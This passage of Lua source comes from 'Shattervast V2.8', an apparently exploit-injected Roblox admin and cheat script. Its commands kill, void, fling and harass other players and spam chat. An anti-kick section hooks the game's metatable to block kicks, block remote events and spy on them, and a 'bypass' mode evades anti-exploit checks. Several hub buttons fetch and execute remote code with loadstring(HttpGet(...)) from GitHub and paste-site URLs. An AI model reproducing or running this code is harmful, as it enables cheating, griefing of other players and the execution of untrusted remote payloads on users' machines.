				game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer(v.Name.." is on "..v.OsPlatform, "All")
			end
		end
	end

	spinning = false
	Commands.spin = function(args)
		if args[1] then
			for i,v in pairs(findSinglePlayer(args[1])) do
				run(commandPrefix.."attach "..v.Name)
				annplr = v
				annoying = true
				spinning = true
			end
		end
	end

	Commands.unspin = function(args)
		if spinning then
			annoying = false
			spinning = false
		end
		run(""..commandPrefix.."unattach")
	end

	Commands.explorer = function(args)
		loadstring(game:GetObjects("rbxassetid://418957341")[1].Source)()
		Notification("info", "Loaded DEX explorer!", 5)
	end

	Commands.maxzoom = function(args)
		if args[1] then
			LP.CameraMaxZoomDistance = args[1]
		end
	end

	Commands.stare = function(args)
		if args[1] then
			for i,v in pairs(findSinglePlayer(args[1])) do
				stareplr = v
				staring = true
			end
		end
	end

	Commands.unstare = function(args)
		staring = false
	end

	Commands.tempgod = function(args)
		local hu = LP.Character.Humanoid
		local l = Instance.new("Humanoid")
		l.Parent = LP.Character
		l.Name = "Humanoid"
		wait(0.1)
		hu.Parent = LP
		gsWorkspace.CurrentCamera.CameraSubject = LP.Character
		LP.Character.Animate.Disabled = true
		wait(0.1)
		LP.Character.Animate.Disabled = false
		Notification("info", "Enabled Temp FE Godmode", 4)
	end

	Commands.void = function(args)
		if hasTools() == false then
			Notification("warning", "You need a tool in your backpack/inventory to use this command.", 8)
		else
			FEGodmode()
			for i,v in pairs(LP.Backpack:GetChildren())do
				LP.Character.Humanoid:EquipTool(v)
			end
			if args[1] then
				for i,v in pairs(findSinglePlayer(args[1])) do
					local NOW = LP.Character.HumanoidRootPart.CFrame
					LP.Character.HumanoidRootPart.CFrame = v.Character["Left Arm"].CFrame
					wait(0.3)
					LP.Character.HumanoidRootPart.CFrame = v.Character["Left Arm"].CFrame
					local function tp(player,player2)
						local char1,char2=player.Character,player2.Character
						if char1 and char2 then
							char1:MoveTo(char2.Head.Position)
						end
					end
					wait(0.5)
					LP.Character.HumanoidRootPart.CFrame = CFrame.new(Vector3.new(999999999999999,0,999999999999999))
				end
			end
		end
	end

	Commands.freefall = function(args)
		if hasTools() == false then
			Notification("warning", "You need a tool in your backpack/inventory to use this command.", 8)
		else
			FEGodmode()
			for i,v in pairs(LP.Backpack:GetChildren())do
				LP.Character.Humanoid:EquipTool(v)
			end
			if args[1] then
				for i,v in pairs(findSinglePlayer(args[1])) do
					local NOW = LP.Character.HumanoidRootPart.CFrame
					LP.Character.HumanoidRootPart.CFrame = v.Character["Left Arm"].CFrame
					wait(0.3)
					LP.Character.HumanoidRootPart.CFrame = v.Character["Left Arm"].CFrame
					wait(0.5)
					LP.Character.HumanoidRootPart.CFrame = NOW
					wait(0.5)
					LP.Character.HumanoidRootPart.CFrame = NOW
					wait(0.6)
					LP.Character.HumanoidRootPart.CFrame = CFrame.new(0,50000,0)
				end
			end
		end
	end

	Commands.version = function(args)
		Notification("info", "Current Shattervast Version: V2.8", 7)
	end

	Commands.shiftlockon = function(args)
		LP.DevEnableMouseLock = true
		Notification("info", "Shift lock enabled!", 5)
	end

	for i,needChat in pairs(gsPlayers:GetPlayers()) do
		needChat.Chatted:Connect(function(msg)
			if copychatall then
				game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer(msg, "All")
			end
		end)
	end
	gsPlayers.PlayerAdded:Connect(function(plr)
		plr.Chatted:Connect(function(msg)
			if copychatall then
				game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer(msg, "All")
			end
		end)
	end)

	copychatplayer = nil
	copychatall = false
	copychatACTIVE = false
	Commands.copychat = function(args)
		if args[1] then
			if string.lower(args[1]) == "all" or string.lower(args[1]) == "others" then
				copychatall = true
			else
				for i,v in pairs(findPlayer(args[1])) do
					if v ~= LP then
						copychatplayer = v
						copychatACTIVE = true
					end
				end
			end
		end
	end

	Commands.uncopychat = function(args)
		copychatall = false
		copychatACTIVE = false
	end

	Commands.newkill =  function(args)
		if hasTools() == false then
			Notification("warning", "You need TWO tools in your backpack/inventory to use this command.", 8)
		else
			if args[1] then
				for i,plr in pairs(findSinglePlayer(args[1])) do
					for i,v in pairs(LP.Backpack:GetChildren())do
						LP.Character.Humanoid:EquipTool(v)
					end	
					for i,v in pairs(LP.Backpack:GetDescendants()) do
						if v:IsA("Tool") then
							v.Parent = LP.Character
							wait()
							v.Parent = plr.Character
						end
					end
					wait(0.4)
					LP.Character.HumanoidRootPart.CFrame = CFrame.new(Vector3.new(4000000, -10, 200000))
				end
			end
		end
	end

	Commands.newattach =  function(args)
		if hasTools() == false then
			Notification("warning", "You need TWO tools in your backpack/inventory to use this command.", 8)
		else
			if args[1] then
				for i,plr in pairs(findSinglePlayer(args[1])) do
					for i,v in pairs(LP.Backpack:GetChildren())do
						LP.Character.Humanoid:EquipTool(v)
					end	
					for i,v in pairs(LP.Backpack:GetDescendants()) do
						if v:IsA("Tool") then
							v.Parent = LP.Character
							wait()
							v.Parent = plr.Character
						end
					end
				end
			end
		end
	end

	Commands.newbring =  function(args)
		if hasTools() == false then
			Notification("warning", "You need TWO tools in your backpack/inventory to use this command.", 8)
		else
			if args[1] then
				for i,plr in pairs(findSinglePlayer(args[1])) do
					local NOW = LP.Character.HumanoidRootPart.CFrame
					for i,v in pairs(LP.Backpack:GetChildren())do
						LP.Character.Humanoid:EquipTool(v)
					end	
					for i,v in pairs(LP.Backpack:GetDescendants()) do
						if v:IsA("Tool") then
							v.Parent = LP.Character
							wait()
							v.Parent = plr.Character
						end
					end
					wait(0.4)
					LP.Character.HumanoidRootPart.CFrame = NOW
					wait(0.4)
					LP.Character.HumanoidRootPart.CFrame = NOW
				end
			end
		end
	end

	Commands.spawn = function(args)
		if args[1] then
			if string.lower(tostring(args[1])) == "ws" then
				spawnWS = args[2] or CurrentWalkspeed
				LP.Character.Humanoid.WalkSpeed = args[2] or CurrentWalkspeed
			elseif string.lower(tostring(args[1])) == "jp" then
				spawnJP = args[2] or CurrentJumppower
				LP.Character.Humanoid.JumpPower = args[2] or CurrentJumppower
			elseif string.lower(tostring(args[1])) == "hh" then
				spawnHH = args[2] or CurrentHipheight
				LP.Character.Humanoid.HipHeight = args[2] or CurrentHipheight
			elseif string.lower(tostring(args[1])) == "god" then
				spawningfegod = true
				FEGodmode()
			end
		end
	end

	Commands.unspawn = function(args)
		spawnWS = CurrentWalkspeed
		spawnJP = CurrentJumppower
		spawnHH = CurrentHipheight
		spawningfegod = false
		Notification("info", "Reset spawning stats", 5)
	end

	savingtoolsloop = false
	Commands.autosavetool = function(args)
		if args[1] then
			if string.lower(tostring(args[1])) == "on" then
				savingtoolsloop = true
			elseif string.lower(tostring(args[1])) == "off" then
				savingtoolsloop = false
			end
		end
	end

	modeFling = false
	modeCompliment = false
	modeMove = false
	modeInfo = false
	Commands.beginbot = function(args)
		if not args[1] then
			print("fling // compliment // move // info")
			Notification("info", ""..commandPrefix.."beginbot Modes printed", 5)
		else
			if string.lower(tostring(args[1])) == "fling" then
				modeFling = true
				game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer("Hello! I am Fling-Bot 5000! Say !fling [Player] to fling that player!", "All")
			elseif string.lower(tostring(args[1])) == "compliment" then
				modeCompliment = true
				complimentReady = true
				game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer("Good day, I am Compliment-Bot. Say !c [Player] to give them a compliment.", "All")
			elseif string.lower(tostring(args[1])) == "move" then
				modeMove = true
				game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer("Hi, I am movement bot. Commands you can use: !walk [Player], !bringbot, !follow [Player].", "All")
			elseif string.lower(tostring(args[1])) == "info" then
				modeInfo = true
				infoReady = true
				game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer("Hey, I'm Info-Bot. Commands you can use: !age [Player], !id [Player].", "All")
			end
		end
	end

	Commands.endbot = function(args)
		if not args[1] then
			modeFling = false
			modeCompliment = false
			modeMove = false
			modeInfo = false
		else
			if string.lower(tostring(args[1])) == "fling" then
				modeFling = false
			elseif string.lower(tostring(args[1])) == "compliment" then
				modeCompliment = false
			elseif string.lower(tostring(args[1])) == "move" then
				modeMove = false
			elseif string.lower(tostring(args[1])) == "info" then
				modeInfo = false
			end
		end
	end

	Commands.stopsit = function(args)
		stopsitting = true
	end

	Commands.gosit = function(args)
		stopsitting = false
	end

	chattingerror = true
	Commands.chaterror = function(args)
		if chattingerror then
			chattingerror = false
			game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer(" ", "All")
			game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer(" ", "All")
			wait(4)
			game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer(" ", "All")
			wait(3)
			chattingerror = true
		end
	end

	spawnpos = nil
	spawningpos = true
	Commands.spawnpoint = function(args)
		spawnpos = LP.Character.HumanoidRootPart.CFrame
		spawningpos = true
		Notification("info", "Spawn point has been set! Use "..commandPrefix.."nospawn to remove.", 6)
	end

	Commands.nospawn = function(args)
		spawningpos = false
		Notification("info", "Spawn point has been removed. Use "..commandPrefix.."spawnpoint to enable.", 6)
	end

	Commands.bypass = function(args)
		if args[1] then
			if string.lower(tostring(args[1])) == "on" then
				bypassMODE = true
				Notification("warning", "Bypass mode turned on, this changes functions of "..commandPrefix.."fly and other commands to bypass most anti-exploits.", 7)
			elseif string.lower(tostring(args[1])) == "off" then
				bypassMODE = false
				Notification("warning", "Bypass mode has been turned off.", 7)
			end
		end
	end

	Commands.fixcam = function(args)
		gsWorkspace.CurrentCamera:Destroy()
		wait(0.1)
		game:GetService("Workspace").CurrentCamera.CameraSubject = LP.Character.Humanoid
		game:GetService("Workspace").CurrentCamera.CameraType = "Custom"
		LP.CameraMinZoomDistance = 0.5
		LP.CameraMaxZoomDistance = 400
		LP.CameraMode = "Classic"
		LP.DevCameraOcclusionMode = CurrentNormal
	end

	Commands.gotoobj = function(args)
		if args[1] then
			for i,v in pairs(gsWorkspace:GetDescendants()) do
				if string.lower(v.Name) == string.lower(tostring(args[1])) then
					LP.Character.HumanoidRootPart.CFrame = v.CFrame + Vector3.new(0, 3, 0)
				end
			end
		end
	end

	Commands.breakcam = function(args)
		gsWorkspace.CurrentCamera.CameraSubject = LP.Character.Head
	end

	Commands.inviscam = function(args)
		LP.DevCameraOcclusionMode = "Invisicam"
	end

	printobjKEY = ""
	printobjCLICKING = false
	printobjACTIVE = false

	Commands.printobj = function(args)
		if args[1] then
			printobjKEY = string.sub(tostring(args[1]), 1, 1)
			printobjACTIVE = true
			printobjCLICKING = false
		else
			printobjKEY = ""
			printobjACTIVE = true
			printobjCLICKING = true
		end
	end

	Mouse.KeyDown:Connect(function(key) 
		if key == printobjKEY and printobjACTIVE == true then 
			if Mouse.Target then
				local path = Mouse.Target:GetFullName()
				local getPath = "game:GetService(\"Workspace\")"
				local getSpaces = ""
				local separate = {}
				local a = nil
				for v in string.gmatch(string.sub(path, 10), "[^.]+") do
					if string.match(v, " ") then
						a = "["..v.."]"
						table.insert(separate, a)
					else
						a = "."..v
						table.insert(separate, a)
					end
					getSpaces = table.concat(separate, "")
				end
				local fullPath = getPath..getSpaces
				print(fullPath)
			end 
		end
	end)
	Mouse.Button1Down:Connect(function()
		if printobjCLICKING == true and printobjACTIVE == true then
			if Mouse.Target then 
				local path = Mouse.Target:GetFullName()
				local getPath = "game:GetService(\"Workspace\")"
				local getSpaces = ""
				local separate = {}
				local a = nil
				for v in string.gmatch(string.sub(path, 10), "[^.]+") do
					if string.match(v, " ") then
						a = "["..v.."]"
						table.insert(separate, a)
					else
						a = "."..v
						table.insert(separate, a)
					end
					getSpaces = table.concat(separate, "")
				end
				local fullPath = getPath..getSpaces
				print(fullPath)
			end 
		end
	end)

	Commands.unprintobj = function(args)
		printobjACTIVE = false
		printobjCLICKING = false
	end

	Commands.hotkeyfc = function(args)
		if args[1] then
			if string.lower(tostring(args[1])) == "goto" then
				fchotkeymode = "goto"
			elseif string.lower(tostring(args[1])) == "unfc" then
				fchotkeymode = "unfc"
			end
			fullUpdate()
		end
	end

	Commands.carpet = function(args)
		if args[1] then
			for i,v in pairs(findSinglePlayer(args[1])) do
				if v ~= nil then
					annoying = true
					annplr = v
					local carpetAnimation = Instance.new("Animation")
					carpetAnimation.AnimationId = "rbxassetid://282574440"
					carpetTrack = LP.Character.Humanoid:LoadAnimation(carpetAnimation)
					carpetTrack:Play(.1, 1, 1)
				end
			end
		end
	end

	Commands.uncarpet = function(args)
		annoying = false
		carpetTrack:Stop()
	end

	Commands.brickcreate = function(args)
		if args[1] then
			local createPosition = LP.Character.HumanoidRootPart.CFrame
			if args[2] and args[3] and args[4] then
				createPosition = CFrame.new(Vector3.new(args[2], args[3], args[4]))
			else
				createPosition = LP.Character.HumanoidRootPart.CFrame
			end
			for i = 1, args[1] do
				LP.Character.HumanoidRootPart.CFrame = createPosition
				run(commandPrefix.."blockhats")
				wait(0.2)
				run(commandPrefix.."drophats")
				wait(0.2)
				run(commandPrefix.."reset")
				wait(6)
			end
		end
	end

	Commands.forward = function(args)
		if args[1] then
			forwardSpeed = args[1]
		else
			forwardSpeed = 1
		end
		cmdForward = true
	end

	Commands.unforward = function(args)
		cmdForward = false
	end

	Commands.id = function(args)
		if args[1] then
			for i,v in pairs(findPlayer(args[1])) do
				game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer(v.Name.." Account ID: "..v.UserId.."!", "All")
			end
		end
	end

	Commands.spinhats = function(args) -- Credit to xFunnieuss
		for i,v in pairs(LP.Character:GetDescendants()) do
			if v:IsA("Accessory") or v:IsA("Hat") then
				local keep = Instance.new("BodyPosition") keep.Parent = v.Handle keep.Name = "no"
				local spin = Instance.new("BodyAngularVelocity") spin.Parent = v.Handle spin.Name = "ha"
				if v.Handle.AccessoryWeld then
					v.Handle.AccessoryWeld:Destroy()
				end
				if args[1] then
					spin.AngularVelocity = Vector3.new(0, args[1], 0)
					spin.MaxTorque = Vector3.new(0, args[1] * 2, 0)
				else
					spin.AngularVelocity = Vector3.new(0, 100, 0)
					spin.MaxTorque = Vector3.new(0, 200, 0)
				end
				keep.P = 30000
				keep.D = 50
				spinObj = keep
				spinTOhead = true
			end
		end
	end

	Commands.unspinhats = function(args)
		for i,v in pairs(LP.Character:GetDescendants()) do
			if v:IsA("Accessory") or v:IsA("Hat") then
				pcall(function()
					run(commandPrefix.."drophats")
					wait(2)
					v.Handle.spin:Destroy()
					v.Handle.keep:Destroy()
				end)
			end
		end
	end

	savedmap = {}
	Commands.savemap = function(args)
		for i,v in pairs(gsWorkspace:GetChildren()) do
			v.Archivable = true
			if not v:IsA("Terrain") and not v:IsA("Camera") then
				if not gsPlayers:FindFirstChild(v.Name) then
					table.insert(savedmap, v:Clone())
				end
			end
		end
		clientSided()
	end

	Commands.loadmap = function(args)
		for i,v in pairs(gsWorkspace:GetChildren()) do
			if not v:IsA("Terrain") and not v:IsA("Camera") then
				if not gsPlayers:FindFirstChild(v.Name) then
					pcall(function()
						v:Destroy()
					end)
				end
			end
		end
		for i,a in ipairs(savedmap) do
			a:Clone().Parent = gsWorkspace
		end
		clientSided()
	end

	Commands.creatorid = function(args)
		LP.UserId = game.CreatorId
	end

	Commands.gameid = function(args)
		Notification("info", "Current game's ID = "..game.GameId, 8)
	end

	Commands.delobj = function(args)
		if args[1] then
			for i,v in pairs(gsWorkspace:GetDescendants()) do
				if string.lower(v.Name) == string.lower(tostring(args[1])) then
					v:Destroy()
					clientSided()
				end
			end
		end
	end

	Commands.glide = function(args)
		if args[1] then
			for i,v in pairs(findSinglePlayer(args[1])) do
				local goal = {}
				goal.CFrame = v.Character.HumanoidRootPart.CFrame
				local defaultSpeed = 3
				if args[2] then
					if tonumber(args[2]) < 10 then
						defaultSpeed = tonumber(args[2])
					else
						defaultSpeed = 5
					end
				else
					defaultSpeed = 3
				end
				local goalFunction = gsTween:Create(LP.Character.HumanoidRootPart, TweenInfo.new(defaultSpeed, Enum.EasingStyle.Sine, Enum.EasingDirection.InOut), goal)
				goalFunction:Play()
			end
		end
	end

	stutterON = false
	Commands.stutter = function(args)
		if args[1] then
			if string.lower(tostring(args[1])) == "on" then
				stutterON = true
			elseif string.lower(tostring(args[1])) == "off" then
				stutterON = false
				wait(0.4)
				LP.Character.HumanoidRootPart.Anchored = false
			end 
		end
	end

	spawn(function()
		while wait(0.1) do
			if stutterON == true then
				LP.Character.HumanoidRootPart.Anchored = false
				wait(0.1)
				LP.Character.HumanoidRootPart.Anchored = true
			end
		end
	end)

	Commands.platform = function(args)
		local a = Instance.new("Part")
		a.Parent = gsWorkspace
		a.Size = Vector3.new(10, 1, 10)
		a.Anchored = true
		a.CFrame = LP.Character.HumanoidRootPart.CFrame + Vector3.new(0, 5, 0)
		LP.Character.HumanoidRootPart.CFrame = a.CFrame + Vector3.new(0, 2, 0)
		clientSided()
		wait(20)
		a:Destroy()
	end

	Commands.servertime = function(args)
		Notification("info", "Server time is "..math.ceil(tonumber(gsWorkspace.DistributedGameTime)).." seconds.", 8)
	end

	Commands.ride = function(args)
		if args[1] then
			for i,v in pairs(findSinglePlayer(args[1])) do
				local Anim = Instance.new("Animation")
				Anim.AnimationId = "rbxassetid://179224234"
				RIDEtrack = LP.Character.Humanoid:LoadAnimation(Anim)
				rideACTIVE = true
				ridePLAYER = v
				RIDEtrack:Play()
			end
		end
	end

	Commands.unride = function(args)
		RIDEtrack:Stop()
		rideACTIVE = false
	end

	Commands.cmute = function(args)
		if args[1] then
			for i,v in pairs(findSinglePlayer(args[1])) do
				game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer("/mute "..v.Name, "All")
				clientSided()
			end
		end
	end

	Commands.uncmute = function(args)
		if args[1] then
			for i,v in pairs(findSinglePlayer(args[1])) do
				game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer("/unmute "..v.Name, "All")
			end
		end
	end

	Commands.hat = function(args)
		if args[1] then
			for i,v in pairs(findSinglePlayer(args[1])) do
				local Anim = Instance.new("Animation")
				Anim.AnimationId = "rbxassetid://282574440"
				HATtrack = LP.Character.Humanoid:LoadAnimation(Anim)
				rideACTIVE = true
				ridePLAYER = v
				HATtrack:Play()
				view(v)
			end
		end
	end

	Commands.unhat = function(args)
		HATtrack:Stop()
		rideACTIVE = false
		view(LP)
	end

--[[Commands.spawnreset = function(args)
	if args[1] then
		if string.lower(tostring(args[1])) == "on" then
			spawningatreset = true
		elseif string.lower(tostring(args[1])) == "off" then
			spawningatreset = false
		end
	end
end]]

	Commands.chat = function(args)
		if args[1] then
			local Chatmsg = table.concat(args, " ")
			game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer(Chatmsg, "All")
		end
	end

	-- findPlayer function (ALL, OTHERS, ME, NOOBS, VETERANS, OLDVETERANS, FRIENDS, NOFRIENDS, DEFAULT, RANDOM, SAMETEAM, NOTEAM, OTHERTEAM, TEAMname)
	function findPlayer(plr)
		local players = {}
		local find = plr:lower()
		local getAllNames = getmultipleplayers(find)
		for i,mplr in pairs(getAllNames) do
			if mplr == "all" then
				for i,v in pairs(gsPlayers:GetPlayers()) do
					table.insert(players,v)
				end
			elseif mplr == "others" then
				for i,v in pairs(gsPlayers:GetPlayers()) do
					if v.Name ~= LP.Name then
						table.insert(players,v)
					end
				end 
			elseif mplr == "me" then
				table.insert(players,LP)
			elseif mplr == "noobs" then
				for i,v in pairs(gsPlayers:GetPlayers()) do
					if v.AccountAge <= 3 then
						table.insert(players,v)
					end
				end
			elseif mplr == "veterans" then
				for i,v in pairs(gsPlayers:GetPlayers()) do
					if v.AccountAge >= 365 then
						table.insert(players,v)
					end
				end
			elseif mplr == "oldveterans" then
				for i,v in pairs(gsPlayers:GetPlayers()) do
					if v.AccountAge >= 1500 then
						table.insert(players,v)
					end
				end
			elseif mplr == "friends" then
				for i,v in pairs(gsPlayers:GetPlayers()) do
					if v:IsFriendsWith(LP.UserId) and v.Name ~= LP.Name then
						table.insert(players,v)
					end
				end
			elseif mplr == "nofriends" then
				for i,v in pairs(gsPlayers:GetPlayers()) do
					if not v:IsFriendsWith(LP.UserId) and v.Name ~= LP.Name then
						table.insert(players,v)
					end
				end
			elseif mplr == "default" then
				for i,v in pairs(gsPlayers:GetPlayers()) do
					if v.Character:FindFirstChild("Pal Hair") or v.Character:FindFirstChild("Kate Hair") then
						table.insert(players,v)
					end
				end
			elseif mplr == "random" then
				for i,v in pairs(gsPlayers:GetPlayers()) do
					table.insert(players,v[math.random(1, #v)])
				end
			elseif mplr == "sameteam" then
				for i,v in pairs(gsPlayers:GetPlayers()) do
					if v.Team == LP.Team then
						table.insert(players,v)
					end
				end
			elseif mplr == "noteam" then
				for i,v in pairs(gsPlayers:GetPlayers()) do
					if v.Team == nil then
						table.insert(players,v)
					end
				end
			elseif mplr == "otherteam" then
				for i,v in pairs(gsPlayers:GetPlayers()) do
					if v.Team ~= LP.Team then
						table.insert(players,v)
					end
				end
			elseif string.sub(mplr, 1, 4) == "team" then
				for i,v in pairs(gsPlayers:GetPlayers()) do
					local spaceTEAM = {}
					for teamValues in (string.gmatch(string.sub(mplr, 5), "[^_]+")) do
						spaceTEAM[#spaceTEAM + 1] = teamValues
					end
					local gottrueteam = table.concat(spaceTEAM, " ")
					if string.lower(tostring(v.Team)) == string.lower(gottrueteam) then
						table.insert(players,v)
					end
				end	
			else
				for i,v in pairs(gsPlayers:GetPlayers()) do
					if string.lower(v.Name):sub(1, #mplr) == string.lower(mplr) then
						table.insert(players,v)
					end
				end
			end
		end

		return players    
	end
	function getmultipleplayers(plr)
		local plrsgotten = {}
		for i in string.gmatch(plr,"[^,]+") do
			table.insert(plrsgotten,i)
		end
		return plrsgotten
	end
	function findSinglePlayer(plr)
		local players = {}
		local find = plr:lower()
		if find == "me" then
			table.insert(players,LP)
		else
			for i,v in pairs(gsPlayers:GetPlayers()) do
				if string.lower(v.Name):sub(1, #find) == string.lower(find) then
					table.insert(players,v)
				end
			end
		end
		local oneplayer = {}
		pcall(function()
			table.insert(oneplayer, players[math.random(1, #players)])
		end)
		return oneplayer
	end

	-- Anti Kick

	if getrawmetatable then
		function formatargs(getArgs,v)
			if #getArgs == 0 then 
				return "" 
			end

			local collectArgs = {}
			for k,v in next,getArgs do
				local argument = ""
				if type(v) == "string" then
					argument = "\""..v.."\""
				elseif type(v) == "table" then
					argument = "{" .. formatargs(v,true) .. "}"
				else
					argument = tostring(v)
				end
				if v and type(k) ~= "number" then
					table.insert(collectArgs,k.."="..argument)
				else
					table.insert(collectArgs,argument)
				end
			end
			return table.concat(collectArgs, ", ")
		end

		kicknum = 0
		local game_meta = getrawmetatable(game)
		local game_namecall = game_meta.__namecall
		local game_index = game_meta.__index
		local w = (setreadonly or fullaccess or make_writeable)
		pcall(w, game_meta, false)
		game_meta.__namecall = function(out, ...)
			local args = {...}
			local Method = args[#args]
			args[#args] = nil

			if Method == "Kick" and out == LP then
				kicknum = kicknum + 1
				warn("Blocked client-kick attempt "..kicknum)
				return
			end

			if antiremotes then
				if Method == "FireServer" or Method == "InvokeServer" then
					if out.Name ~= "CharacterSoundEvent" and out.Name ~= "SayMessageRequest" and out.Name ~= "AddCharacterLoadedEvent" and out.Name ~= "RemoveCharacterEvent" and out.Name ~= "DefaultServerSoundEvent" and out.Parent ~= "DefaultChatSystemChatEvents" then
						warn("Blocked remote: "..out.Name.." // Method: "..Method)
						return
					end
				end
			else
				if Method == "FireServer" or Method == "InvokeServer" then
					for i,noremote in pairs(blockedremotes) do
						if out.Name == noremote and out.Name ~= "SayMessageRequest" then
							warn("Blocked remote: "..out.Name.." // Method: "..Method)
							return
						end
					end
				end
			end

			if spyingremotes then
				if Method == "FireServer" or Method == "InvokeServer" then
					if out.Name ~= "CharacterSoundEvent" and out.Name ~= "AddCharacterLoadedEvent" and out.Name ~= "RemoveCharacterEvent" and out.Name ~= "DefaultServerSoundEvent" and out.Name ~= "SayMessageRequest" then
						local arguments = {}
						for i = 1,#args do
							arguments[i] = args[i]
						end
						local getScript = getfenv(2).script
						if getScript == nil then
							getScript = "??? (Not Found) ???"
						end
						warn("<> <> <> A "..out.ClassName.." has been fired! How to fire:\ngame."..out:GetFullName()..":"..Method.."("..formatargs(arguments)..")\n\nFired from script: ".. tostring(getScript:GetFullName()))
					end
				end
			end

			return game_namecall(out, ...)
		end
	end

	-- FE Check
	function FEcheckDefault()
		if gsWorkspace.FilteringEnabled == true then
			createIntro("warning", "FE is enabled! Press "..commandPrefix.." to bring Command Bar.", 7)
		else
			createIntro("warning", "FE is disabled. Consider using a different script.", 7)
		end
	end
	FEcheckDefault()
end)

UICorner_53.Parent = Shattervast

Cmdx.Name = "Cmdx"
Cmdx.Parent = Scripts
Cmdx.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
Cmdx.Position = UDim2.new(0, 0, 0.627378941, 0)
Cmdx.Size = UDim2.new(0, 71, 0, 50)
Cmdx.Font = Enum.Font.SciFi
Cmdx.Text = "CMD-X"
Cmdx.TextColor3 = Color3.fromRGB(0, 0, 0)
Cmdx.TextScaled = true
Cmdx.TextSize = 14.000
Cmdx.TextWrapped = true
Cmdx.MouseButton1Click:connect(function()
	loadstring(game:HttpGet("https://raw.githubusercontent.com/CMD-X/CMD-X/master/Source", true))()
end)

UICorner_54.Parent = Cmdx

Hubs.Name = "Hubs"
Hubs.Parent = Main
Hubs.Active = true
Hubs.BackgroundColor3 = Color3.fromRGB(25, 25, 25)
Hubs.Position = UDim2.new(0.260981917, 0, 0.147679329, 0)
Hubs.Size = UDim2.new(0, 252, 0, 177)
Hubs.Visible = false
Hubs.CanvasSize = UDim2.new(0, 0, 1, 0)

EzHub.Name = "EzHub"
EzHub.Parent = Hubs
EzHub.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
EzHub.Position = UDim2.new(0, 0, -0.000609687995, 0)
EzHub.Size = UDim2.new(0, 71, 0, 50)
EzHub.Font = Enum.Font.SciFi
EzHub.Text = "EzHub"
EzHub.TextColor3 = Color3.fromRGB(0, 0, 0)
EzHub.TextScaled = true
EzHub.TextSize = 14.000
EzHub.TextWrapped = true
EzHub.MouseButton1Click:connect(function()
	loadstring(game:HttpGet(('https://raw.githubusercontent.com/debug420/Ez-Industries-Launcher-Data/master/Launcher.lua'),true))()
end)

UICorner_55.Parent = EzHub

DomainHubV2.Name = "DomainHubV2"
DomainHubV2.Parent = Hubs
DomainHubV2.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
DomainHubV2.Position = UDim2.new(0.56349206, 0, 0.640740514, 0)
DomainHubV2.Size = UDim2.new(0, 71, 0, 50)
DomainHubV2.Font = Enum.Font.SciFi
DomainHubV2.Text = "Domain Hub V2"
DomainHubV2.TextColor3 = Color3.fromRGB(0, 0, 0)
DomainHubV2.TextScaled = true
DomainHubV2.TextSize = 14.000
DomainHubV2.TextWrapped = true
DomainHubV2.MouseButton1Click:connect(function()
	loadstring(game:HttpGet(('https://raw.githubusercontent.com/shlexsoftworks/Domain/main/source'),true))()
end)

UICorner_56.Parent = DomainHubV2

Fanthom.Name = "Fanthom"
Fanthom.Parent = Hubs
Fanthom.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
Fanthom.Position = UDim2.new(0.28174603, 0, 0.640740514, 0)
Fanthom.Size = UDim2.new(0, 71, 0, 50)
Fanthom.Font = Enum.Font.SciFi
Fanthom.Text = "Fathom Hub"
Fanthom.TextColor3 = Color3.fromRGB(0, 0, 0)
Fanthom.TextSize = 18.000
Fanthom.TextWrapped = true
Fanthom.MouseButton1Click:connect(function()
	loadstring(game:HttpGet("https://pastebinp.com/raw/UmhaEvTT",true))()
end)

UICorner_57.Parent = Fanthom

AI.Name = "A.I"
AI.Parent = Hubs
AI.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
AI.Position = UDim2.new(0, 0, 0.640740514, 0)
AI.Size = UDim2.new(0, 71, 0, 50)
AI.Font = Enum.Font.SciFi
AI.Text = "A.I Hub"
AI.TextColor3 = Color3.fromRGB(0, 0, 0)
AI.TextScaled = true
AI.TextSize = 14.000
AI.TextWrapped = true
AI.MouseButton1Click:connect(function()
	pcall(function()
		local content = game:HttpGet("https://raw.githubusercontent.com/ClairSonata/A.I-Hub/main/Intro.lua")
		assert(loadstring(content))()
	end)
end)

UICorner_58.Parent = AI

CocoHub.Name = "CocoHub"
CocoHub.Parent = Hubs
CocoHub.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
CocoHub.Position = UDim2.new(0.56349206, 0, 0.42555064, 0)
CocoHub.Size = UDim2.new(0, 71, 0, 50)
CocoHub.Font = Enum.Font.SciFi
CocoHub.Text = "Coco Hub"
CocoHub.TextColor3 = Color3.fromRGB(0, 0, 0)
CocoHub.TextScaled = true
CocoHub.TextSize = 14.000
CocoHub.TextWrapped = true
CocoHub.MouseButton1Click:connect(function()
	loadstring(game:HttpGet(('https://raw.githubusercontent.com/MarsQQ/CocoHub/master/CocoZHub'),true))()
end)

UICorner_59.Parent = CocoHub

Impulse.Name = "Impulse"
Impulse.Parent = Hubs
Impulse.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
Impulse.Position = UDim2.new(0.28174603, 0, 0.42555064, 0)
Impulse.Size = UDim2.new(0, 71, 0, 50)
Impulse.Font = Enum.Font.SciFi
Impulse.Text = "Impulse Hub"
Impulse.TextColor3 = Color3.fromRGB(0, 0, 0)
Impulse.TextSize = 19.000
Impulse.TextWrapped = true
Impulse.MouseButton1Click:connect(function()
